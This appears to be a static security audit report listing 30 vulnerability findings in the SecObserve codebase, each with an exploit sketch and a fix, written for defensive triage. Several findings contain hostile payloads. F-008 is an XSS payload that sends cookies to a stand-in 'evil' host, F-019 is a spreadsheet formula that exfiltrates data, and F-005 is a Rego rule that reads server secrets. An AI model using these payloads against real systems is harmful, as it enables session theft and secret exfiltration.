# Vulnerability Findings — SecObserve

**Target:** `/home/stefan/workspace/SecObserve/SecObserve`
**Scanned:** 2026-06-05T13:27:41+01:00
**Static review** (no code executed). Findings are candidates for `/triage`, sorted by confidence. 30 findings (9 HIGH, 10 MEDIUM, 11 LOW; 4 low-confidence < 0.4) across 10 focus areas derived from `THREAT_MODEL.md`.

> These are static candidates, not verified exploits. `/triage` does the rigorous N-vote verification and dedupe. For execution-verified crashes, the autonomous pipeline (`vuln-pipeline run`) is the C/C++ path — not applicable to this Python/TS target.

## Summary table

| id | sev | conf | category | file:line | title |
|----|-----|------|----------|-----------|-------|
| F-001 | HIGH | 0.9 | sensitive-data-exposure | core/api/serializers_product.py:295 | Issue-tracker API key returned in product API responses to read-only viewers |
| F-002 | HIGH | 0.9 | sensitive-data-exposure | core/models.py:101 | Issue-tracker API key stored unencrypted while siblings use EncryptedCharField |
| F-003 | HIGH | 0.8 | algorithmic-dos | access_control/services/api_token_authentication.py:49 | API-token auth loops Argon2 verify over every token in the DB per request |
| F-004 | HIGH | 0.8 | tls-verification-disabled | import_observations/models.py:51 | Dependency-Track requests default verify_ssl=False, leaking API key over unverified TLS |
| F-005 | HIGH | 0.8 | code-execution | rules/services/rego_interpreter.py:16 | User Rego policy reads server env via opa.runtime().env (secret exfiltration) |
| F-006 | HIGH | 0.8 | hardcoded-secret | docker-compose-prod-postgres.yml:85 | Committed default DJANGO_SECRET_KEY in shipped prod compose |
| F-007 | HIGH | 0.8 | hardcoded-secret | docker-compose-prod-postgres.yml:86 | Committed default FIELD_ENCRYPTION_KEY defeats all at-rest field encryption |
| F-008 | HIGH | 0.8 | xss | frontend/src/core/observations/Mermaid_Dependencies.tsx:111 | Stored XSS via SBOM component names assigned to element.innerHTML |
| F-009 | MEDIUM | 0.8 | broken-access-control | core/services/assessment.py:65 | Approval gate bypassed by attaching a severity/VEX downgrade to an "In review" change |
| F-010 | MEDIUM | 0.8 | input-validation | core/services/observation.py:254 | NUL-byte cleaning only on description; title/siblings reach DB raw (regression of 156cb2d6) |
| F-011 | MEDIUM | 0.8 | ssrf | import_observations/parsers/dependency_track/parser.py:54 | Dependency-Track base_url user-set, no allowlist/internal-range block (read-SSRF) |
| F-012 | MEDIUM | 0.8 | credential-exposure | issue_tracker/issue_trackers/gitlab_issue_tracker.py:22 | GitLab PRIVATE-TOKEN sent to user-controlled base_url, no host validation |
| F-013 | MEDIUM | 0.8 | template-injection | notifications/services/send_notifications_base.py:43 | JSON breakout in Slack/Teams notifications via backslash in import-derived title |
| F-014 | LOW | 0.8 | weak-crypto | access_control/models.py:119 | JWT_Secret.load() empty-secret regeneration path broken (latent) |
| F-015 | LOW | 0.8 | idor | notifications/api/views.py:67 | mark_as_viewed unscoped lookup → cross-product existence oracle |
| F-016 | MEDIUM | 0.7 | auth-bypass | access_control/api/views.py:318 | No account lockout; unauth login/token-mint brute-forceable |
| F-017 | MEDIUM | 0.7 | hardcoded-secret | docker-compose-prod-postgres.yml:69 | Committed default admin/admin auto-creates a superuser at deploy time |
| F-018 | HIGH | 0.6 | auth-bypass | access_control/services/oidc_authentication.py:79 | OIDC username claim trusted as local-account key → account takeover (config-dependent) |
| F-019 | MEDIUM | 0.6 | csv-injection | commons/services/export.py:47 | XLSX export writes attacker fields into cells without formula-escaping |
| F-020 | LOW | 0.6 | ssrf | notifications/services/send_notifications_base.py:45 | Teams/Slack webhook URL user-controlled, weak host validation (blind SSRF) |
| F-021 | LOW | 0.6 | header-injection | vex/api/views.py:447 | CycloneDX document_id_prefix → Content-Disposition parameter injection |
| F-022 | MEDIUM | 0.4 | algorithmic-dos | import_observations/services/parser_detector.py:45 | Uploaded report parsed into memory with no size cap |
| F-023 | MEDIUM | 0.4 | credential-exposure | issue_tracker/issue_trackers/jira_issue_tracker.py:18 | Jira basic_auth creds sent to user-controlled server URL, no host validation |
| F-024 | LOW | 0.4 | algorithmic-dos | rules/services/rego_interpreter.py:23 | No CPU/time/memory budget around Rego evaluation |
| F-025 | LOW | 0.4 | header-injection | vex/api/views.py:323 | OpenVEX document_id_prefix → Content-Disposition parameter injection |
| F-026 | LOW | 0.4 | broken-access-control | vex/api/views.py:402 | VEX create/update missing explicit VEX_Create check when product omitted |
| F-027 | LOW | 0.3 | sensitive-data-exposure | import_observations/parsers/gitleaks/parser.py:67 | Gitleaks redaction is literal substring replace; mismatch leaves secret stored |
| F-028 | LOW | 0.3 | content-spoofing | notifications/templates/email_observation.tpl:1 | Email templates autoescape-off on import-derived fields (plaintext spoofing) |
| F-029 | LOW | 0.2 | algorithmic-dos | import_observations/parsers/cyclone_dx/parser.py:166 | Unbounded recursion over nested CycloneDX components (json.load-bounded) |
| F-030 | LOW | 0.2 | xss | import_observations/parsers/sarif/parser.py:284 | Report text rendered as markdown (framework-mitigated near-FP) |

---

### F-001 — Issue-tracker API key returned in product API responses to read-only viewers (HIGH, conf 0.9)
`core/api/serializers_product.py:295` — sensitive-data-exposure

ProductSerializer uses `exclude=[...]` (not including `issue_tracker_api_key`) with inherited `fields='__all__'`; no `write_only`/masking, and the only `to_representation` override (ProductCoreSerializer) does not pop it. `ProductViewSet` uses `(IsAuthenticated, UserHasProductPermission)`, so a read-only Viewer can `GET /api/products/{id}/` (and the list endpoint) and receive the cleartext Jira/GitHub/GitLab token. Directly contrasts `ApiConfigurationSerializer.to_representation`, which pops `api_key` unless the caller holds `Api_Configuration_Edit`.

- **Exploit:** A read-only product Viewer GETs the product and reads `issue_tracker_api_key` from the JSON — no edit rights, no DB access — then reuses it against the external tracker.
- **Fix:** Add `extra_kwargs={'issue_tracker_api_key': {'write_only': True}}` or pop it in `to_representation` for callers lacking product-edit; encrypt at rest (F-002).
- **Confidence:** Field is in neither exclude list, no masking, and the only `to_representation` does not pop it — clear contrast with the api_key masking.

### F-002 — Issue-tracker API key stored unencrypted while siblings use EncryptedCharField (HIGH, conf 0.9)
`core/models.py:101` — sensitive-data-exposure

`Product.issue_tracker_api_key`/`issue_tracker_username` are plain `CharField` (confirmed at model and migration level), holding the bearer/PRIVATE-TOKEN/basic-auth credential used against the trackers. Sibling secrets use `EncryptedCharField`: `Api_Configuration.api_key`/`basic_auth_password` and `JWT_Secret.secret`. A DB dump exposes the tracker token in cleartext while the siblings are ciphertext.

- **Exploit:** Anyone with DB-read access (DBA, backup, read replica, SQLi elsewhere) reads working tracker tokens in cleartext.
- **Fix:** Switch the field(s) to `EncryptedCharField`; add a re-encrypting data migration.
- **Confidence:** Verified plain CharField vs EncryptedCharField siblings; a real credential with no encryption.

### F-003 — API-token auth loops Argon2 verify over every token in the DB per request (HIGH, conf 0.8)
`access_control/services/api_token_authentication.py:49` — algorithmic-dos

`_validate_api_token` loads `API_Token_Multiple.objects.all()` and runs `PasswordHasher().verify()` against the attacker-supplied bearer string for every token, no indexed narrowing, no early exit. O(N) expensive Argon2 verifies per unauthenticated request; the 10/s anon throttle caps request rate but not per-request CPU/memory.

- **Exploit:** Stream bogus `APIToken` headers under the rate limit; each forces N Argon2 verifications, saturating workers. No valid token needed.
- **Fix:** Add a non-secret public id/prefix per token, transmit `<id>.<secret>`, look up one row by indexed id, then one `ph.verify`.
- **Confidence:** Unindexed full-table Argon2 loop on untrusted input; genuine amplification scaling with token count.

### F-004 — Dependency-Track requests default verify_ssl=False, leaking API key over unverified TLS (HIGH, conf 0.8)
`import_observations/models.py:51` — tls-verification-disabled

`Api_Configuration.verify_ssl = BooleanField(default=False)`, passed to `requests.get(..., verify=verify_ssl)` in `dependency_track/parser.py:54` (which also sends `X-Api-Key`) and `:152`. Any config created without explicitly enabling it accepts any certificate, so the API key is sent over an unvalidated channel to a user-set host.

- **Exploit:** On-path attacker (or typosquatted host) presents any cert; the connection succeeds and `X-Api-Key` is delivered to the attacker.
- **Fix:** Default `verify_ssl=True`; require a warned, explicit opt-out; don't send the key when verification is off.
- **Confidence:** Default is False with the key on the same request; conditional on an on-path attacker, config-overridable.

### F-005 — User Rego policy reads server env via opa.runtime().env (secret exfiltration) (HIGH, conf 0.8)
`rules/services/rego_interpreter.py:16` — code-execution

`RegoInterpreter` builds a bundle from the attacker-supplied `rule.rego_module` with no capabilities/builtin allow-list. regopy/rego-cpp 1.3.0 implements `opa.runtime()` (env key = process environment) — unlike `http.send`/`net.*`/`crypto.*` which it stubs out. **Empirically confirmed in the in-repo venv.** The query result flows into observation status/severity/priority/vex_justification, which persist and render in the UI/log/exports. The process env holds `DJANGO_SECRET_KEY`, DB creds, OAuth/tracker tokens. Rego rules auto-approve unless `product_rules_need_approval` is on, and approval is operator-dependent (see THREAT_MODEL T8/T12).

- **Exploit:** Author a rule `rt := opa.runtime(); rule := {"status": rt.env.DJANGO_SECRET_KEY}`, apply to a viewable product, read the resulting status/log. No outbound network needed.
- **Fix:** Restrict builtins via an OPA capabilities allow-list (strip `opa.runtime`); or statically reject any module referencing `opa.runtime` at save time and run evaluation in an env-scrubbed subprocess.
- **Confidence:** Empirically confirmed unrestricted `opa.runtime().env` whose result lands in persisted/displayed fields; minor doubt only on per-field length constraints.

### F-006 — Committed default DJANGO_SECRET_KEY in shipped prod compose (HIGH, conf 0.8)
`docker-compose-prod-postgres.yml:85` — hardcoded-secret

Both prod compose files ship `DJANGO_SECRET_KEY: ${SO_DJANGO_SECRET_KEY:-NxYPEF5l...}`. `base.py:29` reads it with no in-code default, so the committed literal is the effective production value if unset. SECRET_KEY signs Django sessions, password-reset, and signed values — forgeable when globally known. (API auth uses a separate DB-stored JWT secret, bounding impact.)

- **Exploit:** Deploy unchanged → attacker forges signed values (password-reset/signed cookies) for account takeover.
- **Fix:** Remove the literal default (drop the `:-...` fallback so it errors); rotate the key; document per-deployment generation.
- **Confidence:** Committed literal + no in-code fallback; real impact, minor scope nuance keeps it below 0.9.

### F-007 — Committed default FIELD_ENCRYPTION_KEY defeats all at-rest field encryption (HIGH, conf 0.8)
`docker-compose-prod-postgres.yml:86` — hardcoded-secret

Both prod compose files ship `FIELD_ENCRYPTION_KEY: ${SO_FIELD_ENCRYPTION_KEY:-DtlkqVb3wl...}`. `base.py:432` reads it with no in-code default. This Fernet key encrypts every `EncryptedCharField` (Api_Configuration creds, JWT_Secret.secret). An operator who doesn't override it uses a globally-known key, making those secrets reversible from a DB dump + the public repo — and with the JWT secret recovered, auth tokens are forgeable for any user.

- **Exploit:** DB dump + public key → Fernet-decrypt api_key/basic_auth_password and JWT secret → forge JWTs (auth bypass).
- **Fix:** Remove the literal default and fail closed when unset; treat the key as burned and rotate.
- **Confidence:** Verified effective fallback keying Fernet encryption of JWT_Secret/api_key; silent misconfig is exploitable.

### F-008 — Stored XSS via SBOM component names assigned to element.innerHTML (HIGH, conf 0.8)
`frontend/src/core/observations/Mermaid_Dependencies.tsx:111` — xss

`createMermaidGraph` (35-89) embeds component names unescaped into a Mermaid source string, which is assigned to `element.innerHTML` at line 111 **before** `mermaid.run()` (112) parses/sanitizes it. The browser HTML-parses the assignment, so `name<img src=x onerror=...>` fires synchronously regardless of mermaid's strict mode. No DOMPurify. Component name/version come from uploaded SBOMs (`cyclone_dx/parser.py:445-454`, spdx, osv), stored unsanitized.

- **Exploit:** Import an SBOM with component name `evil<img src=x onerror=fetch("//evil/"+document.cookie)>`; any user opening the Origins/component view executes it in their authenticated session.
- **Fix:** Use `element.textContent`, escape/allowlist names in `createMermaidGraph`, pin `securityLevel:'strict'`, and sanitize on import.
- **Confidence:** Unescaped attacker data reaches innerHTML before mermaid.run; `<img onerror>` fires on insertion. Residual doubt only on server-side ingestion sanitization.

### F-009 — Approval gate bypassed by attaching a severity/VEX downgrade to an "In review" change (MEDIUM, conf 0.8)
`core/services/assessment.py:65` — broken-access-control

`save_assessment`'s approval-needed condition is ANDed with `new_status != STATUS_IN_REVIEW`, so submitting `status='In review'` short-circuits to AUTO_APPROVED regardless of other changed fields; `_update_observation` then applies severity/priority/vex unconditionally. The serializer accepts these together. On a product with `assessments_need_approval` enabled, a user with `Observation_Assessment` downgrades a finding with no second approver. Same on the bulk path.

- **Exploit:** PATCH a Critical finding `{status:'In review', severity:'None', vex_justification:'vulnerable_code_not_present'}` → severity becomes None, gate flips to passed, no approver.
- **Fix:** Apply the IN_REVIEW exemption only when status is the *only* change; compute approval per-field.
- **Confidence:** Verified short-circuit + unconditional field application + permissive serializer + IN_REVIEW keeps obs active. Doubt only on intended design.

### F-010 — NUL-byte cleaning only on description; title/siblings reach DB raw (regression of 156cb2d6) (MEDIUM, conf 0.8)
`core/services/observation.py:254` — input-validation

Fix 156cb2d6 added a ` ` replace only for `description`. `title` (set from SARIF rule.name/ruleId, gitleaks RuleID, CycloneDX vuln.id), `recommendation`, references, and evidence are not cleaned; `clip_fields` only truncates. On PostgreSQL a NUL in a text column raises `ValueError` at save → unhandled 500, aborting the import.

- **Exploit:** A SARIF rule name containing ` ` becomes `title`, which crashes `observation.save()`. Repeatable import abort.
- **Fix:** Strip/replace ` ` centrally for all text fields (extend `clip_fields`).
- **Confidence:** Confirmed description-only cleaning; same exception class as the accepted past fix.

### F-011 — Dependency-Track base_url user-set, no allowlist/internal-range block (read-SSRF) (MEDIUM, conf 0.8)
`import_observations/parsers/dependency_track/parser.py:54` — ssrf

User-controlled `base_url` is fetched via `requests.get` (`:54`, `:152`) with no scheme/host/IP validation and no block of loopback/169.254.169.254/RFC1918. `test_connection` lets the user trigger it on demand and `check_connection` returns `response.json()` — a read-SSRF oracle; `X-Api-Key` is attached. Actor is Maintainer/Owner.

- **Exploit:** Set base_url to an internal service or the cloud metadata endpoint, trigger test_connection, read the reflected body.
- **Fix:** Validate base_url (https, reject internal ranges with post-DNS recheck, allowlist) on every request.
- **Confidence:** Unvalidated user host fetched server-side with body returned + credential header; only mitigant is semi-trusted authz.

### F-012 — GitLab PRIVATE-TOKEN sent to user-controlled base_url, no host validation (MEDIUM, conf 0.8)
`issue_tracker/issue_trackers/gitlab_issue_tracker.py:22` — credential-exposure

`product.issue_tracker_base_url` (free-form, only trailing-slash trimmed) builds the URL and every call attaches `PRIVATE-TOKEN`. No scheme/host allowlist or internal-range block; `requests` follows redirects by default. (GitHub forces a constant host; GitLab does not.)

- **Exploit:** Set base_url to attacker/internal host → server POSTs the GitLab token there on the next issue op.
- **Fix:** Validate the URL (https, allowlist/internal-range rejection); `allow_redirects=False` on credentialed requests. Apply to GitHub/Jira too.
- **Confidence:** GitLab base_url user-set with no validation, token attached, default redirect-following; mitigant is the Maintainer/Owner gate.

### F-013 — JSON breakout in Slack/Teams notifications via backslash in import-derived title (MEDIUM, conf 0.8)
`notifications/services/send_notifications_base.py:43` — template-injection

The Slack/Teams templates interpolate variables into hand-built JSON with HTML autoescape on, which escapes `< > & ' "` but **not** backslash. The sender then `replace('&quot;','\\"')` (43). A title with a backslash before a quote becomes `\\"` in the JSON byte stream — escaped backslash + unescaped quote — closing the string early so attacker bytes become JSON. `observation.title` is import-derived.

- **Exploit:** Title `X\" ,"summary":"PHISHING ..." ,"x":"` injects MessageCard/Slack JSON keys (forged summary, OpenUri to attacker URL) into a trusted security notification.
- **Fix:** Build the payload as a dict and `json.dumps` it (or `|escapejs` every variable) and remove the `.replace()` hacks.
- **Confidence:** Verified hand-built JSON + autoescape-on + the `&quot;→\"` replace creating a real backslash-parity breakout; gated by a configured webhook.

### F-014 — JWT_Secret.load() empty-secret regeneration path broken (latent) (LOW, conf 0.8)
`access_control/models.py:119` — weak-crypto

`load()` line ~124 calls the string value as a callable (TypeError) instead of assigning. In normal flow the secret is never empty (`save()` generates one and both paths call `save()`), so no live forgery. Reported LOW as a fragile invariant: a future blank secret would crash `load()` instead of self-healing.

- **Fix:** Assign `jwt_secret.secret = cls.create_secret()`, guard signing against a falsy secret, add a test.
- **Confidence:** Broken line confirmed; `save()` guarantees non-empty — a real latent defect with no live exploit.

### F-015 — mark_as_viewed unscoped lookup → cross-product existence oracle (LOW, conf 0.8)
`notifications/api/views.py:67` — idor

`mark_as_viewed` resolves via unscoped `get_notification_by_id(pk)` (not the scoped `get_notifications()` the bulk path uses), and never calls `get_object()`, so `has_object_permission` never runs. A user can probe foreign notification IDs (204-vs-404 oracle) and write an inert `Notification_Viewed` row against them. No content disclosed.

- **Fix:** Use a scoped lookup (`get_notifications().filter(pk=pk).first()`) or `self.get_object()`.
- **Confidence:** Unscoped lookup with no object-permission gate vs the scoped bulk path; real LOW-impact oracle.

### F-016 — No account lockout; unauth login/token-mint brute-forceable (MEDIUM, conf 0.7)
`access_control/api/views.py:318` — auth-bypass

`AuthenticateView`/`UserAPITokenCreateView`/`UserAPITokenRevokeView` disable auth and run `django_authenticate` with no lockout/axes (only ModelBackend). The only control is the 10/s anon IP throttle. `create_user_api_token` mints a long-lived token on success.

- **Exploit:** Per-username guessing at ~10/s/IP against `create_user_api_token`; on success, a persistent token.
- **Fix:** Per-account lockout/backoff (django-axes or cache counter) + a dedicated scoped throttle; require a session to mint tokens.
- **Confidence:** Confirmed no lockout, IP-only throttle; T10 was in scope — a real auth weakness, not the excluded volumetric class.

### F-017 — Committed default admin/admin auto-creates a superuser at deploy time (MEDIUM, conf 0.7)
`docker-compose-prod-postgres.yml:69` — hardcoded-secret

Compose sets `ADMIN_PASSWORD:${SO_ADMIN_PASSWORD:-admin}`; the entrypoint creates a superuser from it on first boot. The entrypoint's random-password safety only fires when the var is empty — but compose injects literal `admin`, so an unoverridden deploy yields `admin`/`admin`.

- **Exploit:** Deploy unchanged → log in with admin/admin → full admin.
- **Fix:** Drop the `:-admin` fallback (defer to the entrypoint's random path) or generate+surface a random default.
- **Confidence:** Compose default defeats the entrypoint's random-password safety; MEDIUM, operator-overridable.

### F-018 — OIDC username claim trusted as local-account key → account takeover (config-dependent) (HIGH, conf 0.6)
`access_control/services/oidc_authentication.py:79` — auth-bypass

After token validation, `username = payload.get(env[OIDC_USERNAME])` is the sole key in `get_user_by_username` (find-or-create), with no `(iss,sub)` binding and no `is_oidc_user` gate before the user becomes the identity. Single shared User namespace. If `OIDC_USERNAME` maps to a mutable/non-unique claim (preferred_username, email local-part), an OIDC principal whose claim equals an existing local username (e.g. `admin`) is authenticated as them.

- **Exploit:** Set IdP `preferred_username` to `admin`, get a signed token → resolve to the local admin → superuser.
- **Fix:** Bind to `(iss, sub)` on a stable immutable claim; refuse login as an existing non-OIDC user; document a unique non-self-serviceable claim.
- **Confidence:** Code path confirmed (no iss/sub binding, no is_oidc_user gate), but exploitability hinges on the operator's claim choice — triage may downgrade to config-hardening.

### F-019 — XLSX export writes attacker fields into cells without formula-escaping (MEDIUM, conf 0.6)
`commons/services/export.py:47` — csv-injection

`export_excel` writes every attribute via `worksheet.cell(...value=value)` with no neutralization of leading `= + - @`. defusedcsv covers only the CSV path (`:63`), not openpyxl. Observation title/description/component_name come from imports. All three XLSX exporters route through this.

- **Exploit:** Import a title `=HYPERLINK("http://evil/?d="&A2&B2,"click")`; a reviewer opens the XLSX and the formula evaluates (cell exfil / DDE).
- **Fix:** Formula-escape string cells (prefix `= + - @` tab/CR with `'`) in a shared helper used by header and value writes.
- **Confidence:** Real parallel gap (CSV hardened, XLSX not); MEDIUM client-side, needs the victim to open + dismiss warnings.

### F-020 — Teams/Slack webhook URL user-controlled, weak host validation (blind SSRF) (LOW, conf 0.6)
`notifications/services/send_notifications_base.py:45` — ssrf

`send_msteams/slack_notification` POST to a user-set webhook. Product-level webhooks validate scheme only (and permit localhost); global Settings webhooks have no validator. No internal-range block. No creds in body, response discarded → blind SSRF.

- **Exploit:** Set the webhook to an internal URL; a fired notification makes the server POST there from inside the trust zone.
- **Fix:** Validate (https, expected webhook domains, reject internal/loopback/link-local); disable redirects.
- **Confidence:** Confirmed scheme-only / no validation; blind SSRF, no oracle/creds → low but legitimate.

### F-021 — CycloneDX document_id_prefix → Content-Disposition parameter injection (LOW, conf 0.6)
`vex/api/views.py:447` — header-injection

Free-form `document_id_prefix` is interpolated into `_get_cyclonedx_vex_filename` and concatenated unquoted into the `Content-Disposition` header. Django blocks CR/LF (no response-splitting), but quotes/semicolons/spaces allow parameter injection / filename override.

- **Fix:** Sanitize via the CSAF allowlist and/or RFC 6266-quote; add an input-time RegexValidator.
- **Confidence:** Unsanitized unquoted prefix confirmed; minor since CR/LF is blocked.

### F-022 — Uploaded report parsed into memory with no size cap (MEDIUM, conf 0.4)
`import_observations/services/parser_detector.py:45` — algorithmic-dos

`detect_parser` does `json.load(file)` / full CSV materialization with no size/row/depth limit; the FileField bounds only the filename, and no `DATA_UPLOAD_MAX`/proxy body cap is set. Parsers re-serialize entries via `json.dumps` (amplification). Auth-gated (import permission); largely volumetric (the excluded class) with modest amplification.

- **Fix:** Cap `file.size` before parsing; set `DATA_UPLOAD_MAX_MEMORY_SIZE` + proxy `client_max_body_size`; cap CSV rows / JSON bytes.
- **Confidence:** Confirmed no cap + real amplification, but auth-gated and primarily volumetric → likely downgraded in triage.

### F-023 — Jira basic_auth creds sent to user-controlled server URL, no host validation (MEDIUM, conf 0.4)
`issue_tracker/issue_trackers/jira_issue_tracker.py:18` — credential-exposure

`JIRA(server=issue_tracker_base_url, basic_auth=(...))` with an unvalidated user-set server URL; python-jira sends the creds on the first call. No scheme/host allowlist.

- **Fix:** Validate the Jira server URL (https, allowlist/internal-range rejection); prefer operator-pinned URLs.
- **Confidence:** Real TP but exploitation needs a privileged Maintainer/Owner configuring their own tracker creds → likely low-severity hardening.

### F-024 — No CPU/time/memory budget around Rego evaluation (LOW, conf 0.4)
`rules/services/rego_interpreter.py:23` — algorithmic-dos

`query()` runs `query_bundle` synchronously with no timeout/step/memory cap on attacker-authored policy; `apply_all_rules_for_product` runs it per observation. Gated by rule approval (when enabled) and bounded by policy constants.

- **Fix:** Hard wall-clock timeout + subprocess/thread memory rlimit; cap per-product apply time.
- **Confidence:** Accurate but gated behind approval and bounded by constants → real-but-low DoS often downranked.

### F-025 — OpenVEX document_id_prefix → Content-Disposition parameter injection (LOW, conf 0.4)
`vex/api/views.py:323` — header-injection

Same class as F-021 for OpenVEX: prefix flows through `urlparse().path.split('/')[-1]` into an unquoted header. Slash-traversal defeated; CR/LF blocked by Django; residual is parameter pollution.

- **Fix:** Allowlist-sanitize / RFC 6266-quote; RegexValidator on the prefix.
- **Confidence:** Mechanism verified; minor since CR/LF blocked.

### F-026 — VEX create/update missing explicit VEX_Create check when product omitted (LOW, conf 0.4)
`vex/api/views.py:402` — broken-access-control

Create/update views fall back to default `IsAuthenticated`; the `VEX_Create` check is guarded by `if product:`. With only `vulnerability_names` and no product, no capability check runs — but `get_observations()` scopes data to the caller's products, so no cross-product exposure (defense-in-depth gap only).

- **Fix:** Explicit `permission_classes` + a global VEX capability check when no product is supplied.
- **Confidence:** Guard confirmed and data is scoped → real-but-benign missing check.

### F-027 — Gitleaks redaction is literal substring replace; mismatch leaves secret stored (LOW, conf 0.3)
`import_observations/parsers/gitleaks/parser.py:67` — sensitive-data-exposure

Redaction uses `replace(secret,'REDACTED')`. The line-94 `\r\n` normalization exists for JSON-serialization (not a portable fix to mirror at 67). Residual: if gitleaks reports Secret as a non-exact substring of Match, the replace no-ops and the credential persists. Data is self-submitted → exposure to same-product viewers.

- **Fix:** Redact by documented offsets; drop the field if `secret` is non-empty but not found.
- **Confidence:** Real but depends on a Match/Secret byte mismatch and is self-submitted LOW — unlikely to survive triage.

### F-028 — Email templates autoescape-off on import-derived fields (plaintext spoofing) (LOW, conf 0.3)
`notifications/templates/email_observation.tpl:1` — content-spoofing

Email templates use `{% autoescape off %}` with unescaped import-derived `observation.title`/`product.name`. Sent as plain-text (`send_mail message=`, no `html_message`) → not XSS; a multi-line title injects forged body lines (phishing pretext). Subject/recipients aren't data-derived (Django blocks header CRLF).

- **Fix:** Keep plain-text; strip/normalize newlines/control chars from title/product.name before templating.
- **Confidence:** Plaintext-only spoofing — defense-in-depth, likely downgraded.

### F-029 — Unbounded recursion over nested CycloneDX components (json.load-bounded) (LOW, conf 0.2)
`import_observations/parsers/cyclone_dx/parser.py:166` — algorithmic-dos

`_get_sbom_component_with_subs` recurses per nesting level with no depth cap, but `json.load` usually hits CPython's recursion limit first and raises (caught). Worst case is a caught error / 500.

- **Fix:** Explicit depth limit + reject deep SBOMs; combine with F-022.
- **Confidence:** Self-limited by json parsing → low-severity caught-exception DoS.

### F-030 — Report text rendered as markdown (framework-mitigated near-FP) (LOW, conf 0.2)
`import_observations/parsers/sarif/parser.py:284` — xss

Parsers concatenate report content into the description, rendered by `markdown-to-jsx` (React elements, auto-escaped; URL sanitizer blocks `javascript:`/`data:`; no `dangerouslySetInnerHTML`). Classic stored-XSS is framework-neutralized; residual is HTML-injection/UI-spoofing. Matches the org DO-NOT-REPORT React-XSS criterion — kept as a defense-in-depth note.

- **Fix:** Optionally `disableParsingRawHTML:true` or server-side sanitize; lowest priority.
- **Confidence:** Auto-escaped React rendering, no raw-HTML sink → framework-mitigated near-false-positive.
